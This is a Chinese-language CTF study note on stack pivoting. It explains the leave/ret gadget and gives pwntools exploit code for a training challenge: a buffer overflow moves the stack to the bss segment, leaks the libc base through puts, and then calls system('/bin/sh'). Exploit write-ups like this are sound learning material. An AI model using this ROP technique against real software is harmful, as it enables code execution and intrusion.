---
title: pwn学习记录（其五）
tags:
  - CTF
  - pwn
categories:
  - CTF
abbrlink: 45f7d273
date: 2025-11-18 00:00:00
---
>被冬训题stack-pivot折磨的死去活来，最后发现是bss段不够靠后
# stack-pivot
## 背景
当栈溢出的空间较小，或者开启了PIE保护，可以考虑将指针劫持到bss段进行操作
## 使用条件
可以控制程序执行流，或者可以控制栈顶指针（一般通过``pop rsp/esp``）
## 原理
栈迁移中的关键就是对leave,ret的利用
相当于

    mov rsp，rbp
    pop rbp
连续两次的leave，ret可以将指针劫持到想要的地方
如果构造ROP链

    fake_stack
    addr to leave_ret
    fake rbp
    addr to next gadget
就可以劫持栈指针，一般劫持到bss段后的位置：**注意要离bss段远一点！！！**
## 实践（以冬训题stack-pivot为例）

  bss5=0x601200+0x500
  payload=pwn.flat([b'a'*0x30,p64(bss5),p64(read)])
  sh.sendafter("overflow?\n",payload)
  payload=pwn.flat([b'a'*0x30,p64(bss5+0x30),p64(read)])
  sh.send(payload)
首先通过两次pop|ret，将指针劫持到bss段上

  puts_got=elf.got['puts']
  puts_plt=elf.plt['puts']
  payload= pwn.flat([p64(bss5+0x40),p64(pop_rdi),p64(puts_got),p64(puts_plt),p64(main)])
  sh.send(payload)
  libc.address = u64(sh.recv(6).ljust(8,b'\x00'))-0x80e50
  binsh = next(libc.search(b'/bin/sh'))
  system = libc.sym['system']
  exit_addr = libc.sym['exit']
再在bss段上泄露libc基址

  bss6=0x601200+0x600
  payload = pwn.flat([b'a'*0x30,p64(bss6+0x100), p64(read)])
  sh.sendafter(b'overflow?\n', payload)
  payload=pwn.flat([b'a'*0x30,p64(bss6+0x130),p64(read)])
  sh.send(payload)
  rop_chain =pwn.flat([p64(ret),p64(pop_rdi),p64(binsh),p64(ret),p64(system)])
  sh.send(rop_chain)
再次迁移，执行system
* 注意尽量往bss后段迁移，太近可能导致失败

